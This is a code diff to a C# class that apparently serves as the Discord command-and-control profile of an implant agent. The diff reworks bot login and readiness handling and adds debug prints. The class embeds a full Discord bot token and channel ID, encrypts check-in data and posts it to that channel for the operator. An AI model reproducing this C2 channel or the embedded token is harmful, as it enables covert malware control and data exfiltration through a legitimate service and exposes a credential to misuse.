@@ -20,9 +20,11 @@ namespace Agent.Profiles
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
         private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
+        private AutoResetEvent clientReady = new AutoResetEvent(false);
         private readonly string _token;
-        private readonly string _channel_id;
+        private readonly ulong _channel_id;
         private readonly string _uuid = Guid.NewGuid().ToString();
+        private ITextChannel _channel { get; set; }
         private readonly DiscordSocketClient _client;
         private readonly HttpClient _httpClient; 
         private CheckinResponse cir;
@@ -41,13 +43,19 @@ namespace Agent.Profiles
             agentConfig = config;
             this.messageManager = messageManager;
             _token = "MTE2MTgxMzU2MDc1ODg5ODg1MA.G6w5Wa.fG_vCUM5vlzDmkArxqElYfU5X4LYx9mOEltu8s";
-            _channel_id = "1161813089545638040";
+            _channel_id = ulong.Parse("1161813089545638040");
             var gateway_config = new DiscordSocketConfig()
             {
                 GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
             };
             _client = new DiscordSocketClient(gateway_config);
             _client.MessageReceived += _client_MessageReceived;
+            _client.Ready += _client_Ready;
+        }
+
+        private async Task _client_Ready()
+        {
+            clientReady.Set();
         }
 
         private async Task _client_MessageReceived(SocketMessage message)
@@ -89,8 +97,9 @@ namespace Agent.Profiles
 
         private async Task<bool> Start()
         {
-            await _client.LoginAsync(TokenType.Bot, _token);
             await _client.StartAsync();
+            await _client.LoginAsync(TokenType.Bot, _token);
+            clientReady.WaitOne();
             return _client.LoginState == LoginState.LoggedIn;
         }
 
@@ -143,7 +152,6 @@ namespace Agent.Profiles
                 await this.Start();
             }
 
-
             string msg = this.crypt.Encrypt(json);
             MessageWrapper discordMessage = new MessageWrapper()
             {
@@ -155,12 +163,12 @@ namespace Agent.Profiles
 
             Console.WriteLine(_channel_id);
             Console.WriteLine(_client.LoginState);
+            Console.WriteLine(_client.ConnectionState);
+            Console.WriteLine(_client.Status);
 
-            ITextChannel channel = (ITextChannel)_client.GetChannel(ulong.Parse(_channel_id));
-            Console.WriteLine(_client.LoginState);
+            ITextChannel channel = (ITextChannel)_client.GetChannel(_channel_id);
 
             var chan = _client.GetChannel(1161813089545638040) as ITextChannel;
-            Console.WriteLine(_client.LoginState);
 
             if (chan is null)
             {
